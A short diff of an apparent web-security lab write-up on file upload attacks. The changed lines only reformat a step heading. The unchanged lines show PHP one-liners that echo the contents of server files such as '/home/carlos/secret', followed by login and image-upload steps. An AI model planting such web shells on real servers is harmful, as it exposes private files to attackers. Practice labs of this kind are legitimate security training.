@@ -9,7 +9,9 @@
 <?php echo file_get_contents('/path/to/target/file'); ?>
 <?php echo file_get_contents('/home/carlos/secret'); ?>
 
-### step1
+---
+
+### step 1
 
 login using uername and password
 upload image
